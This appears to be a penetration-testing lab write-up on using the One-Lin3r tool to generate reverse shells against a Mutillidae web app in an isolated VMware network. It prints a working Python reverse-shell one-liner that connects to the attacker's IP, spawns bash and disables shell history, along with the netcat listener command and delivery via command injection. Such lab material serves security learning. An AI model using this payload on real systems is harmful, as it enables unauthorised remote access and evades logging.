# Reverse Shell: ONE-LIN3R

Hi Friend,

Writing a little bit about my recent experience exploring reverse shells. It is one of the common techniques used during penetration testing after entering a system through a web application vulnerability by creating a backdoor network (reverse connection) using commands that can be executed on the operating system.

A reverse shell itself requires having a lot of knowledge about the technologies installed on the server side, for example Windows and Linux, and the languages used such as (Bash, Powershell, nc, socat, perl, Python, PHP, Ruby, etc.). 

Pentesters themselves must be careful in executing or starting a backdoor, because this activity can be detected by advanced defender tools and recorded in the logs as an intrusion action. Some challenges, in my opinion, are that it is very difficult to memorize the code for making backdoors across multiple technologies. Therefore, references from public repositories or utilizing available generator tools are needed.

Here I am taking one tool reference named one-lin3r https://github.com/D4Vinci/One-Lin3r/, this application can generate a one-line script to start a reverse shell as shown in the image below that I included.

![List Payload One-Lin3r](one-lin3r-list.png)

---

## Lab Topology

| Role | Description | IP |
| :--- | :--- | :--- |
| **Attacker** | Attacking machine (Kali Linux) | `10.10.10.149` |
| **Target Web** | Ubuntu Server running Mutillidae | `10.10.10.2` |

**Network Topology:**

```text
+-------------------------------------------------+
|            VMware - 10.10.10.0/24               |
|                                                 |
|  +---------------+      +-------------------+   |
|  |  Kali Linux   |      |   Ubuntu Server   |   |
|  |  [ATTACKER]   |      |   [TARGET WEB]    |   |
|  |  nc Listener  | <--- |   Reverse Shell   |   |
|  |  10.10.10.149 |      |   10.10.10.2      |   |
|  |  Port: 9001   |      |   Mutillidae      |   |
|  +---------------+      +-------------------+   |
+-------------------------------------------------+

```
---

Generating a backdoor script is as simple as choosing from the list as shown in the steps below.

1. Type OneLiner > use linux/python/socket_reverse
2. Prepare attacker station TARGET:PORT (10.10.10.149:9001) 
3. Then see the output as shown in the image below

![Craft the payloads](Craft-the-payloads-revershell.png)

---

This can be fully done on notepad/vscode to change the address to be connected to the target.
```text
python3 -c 'import os,pty,socket;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.149",9001));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.putenv("HISTFILE","/dev/null");pty.spawn("/bin/bash");s.close();'
```
---

On the attacker station itself, you need to open a terminal with a netcat server and simply run the command below.
```text
nc -lvp 9001
```

Let's try the reverse shell above using command injection on the Mutillidae II application.

![Command Injection](command-injection.png)

It can be verified that the reverse shell has connected to the attacker's station.

![Backdoor Connection](backdoor-terkoneksi.png)

Here it can be seen that the connection has been successfully established through Netcat.

A simple application like one-lin3r is very helpful during the penetration testing process, by setting the attacker station's IP address and a specifiable connection port, then a one-line script is crafted. We can directly copy it to the mutillidae web application to start the connection.

**References:**

* **Original Article (Rio Asmara):** [Reverse Shell – One-Lin3r](https://rioasmara.com/2018/12/17/reverse-shell-one-lin3r/)
* **Github Tools:** [D4Vinci/One-Lin3r](https://github.com/D4Vinci/One-Lin3r)
* **latesthackingnews** [What is a reverse shell?](https://latesthackingnews.com/2026/06/16/what-is-a-reverse-shell/)
* **offseckit** [reverse shell cheatsheet](https://offseckit.com/blog/reverse-shell-cheat-sheet)
* **PayloadAllTheThings:** [Reverse Shell Cheat Sheet](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/)

Thank you for stopping by and reading! 

If you have any questions, feedback, or anything you'd like to discuss regarding reverse shells, feel free to open a discussion or create an issue in this repository. Also, don't forget to drop a ⭐ (Star)! Hahaha.

